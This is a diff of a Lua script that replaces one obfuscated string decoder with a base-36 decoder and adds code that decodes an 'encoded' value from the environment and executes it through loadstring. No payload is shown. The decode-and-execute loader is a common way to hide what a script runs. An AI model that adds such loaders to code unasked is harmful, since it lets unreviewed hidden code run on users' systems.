@@ -1,13 +1,20 @@
-local d=string.char
-local b=tonumber
 local function decode(encoded)
-    local c={}
-    for e in encoded:gmatch("([^_]+)") do 
-        table.insert(c,(b(e,16)-5)/3)
+    local decoded = ""
+    local pattern = "([a-zA-Z])([0-9a-z]+)[^a-zA-Z0-9]"
+    
+    for letter, num in encoded:gmatch(pattern) do
+        local charCode = tonumber(num, 36)
+        decoded = decoded .. string.char(charCode)
     end
-    local f=""
-    for g,h in ipairs(c)do 
-        f=f..d(h)
-    end
-    return f
+    
+    return decoded
+end
+
+-- Get the encoded string from the script
+local script = getfenv(1).encoded
+
+-- Decode and execute
+if script then
+    local decodedScript = decode(script)
+    loadstring(decodedScript)()
 end
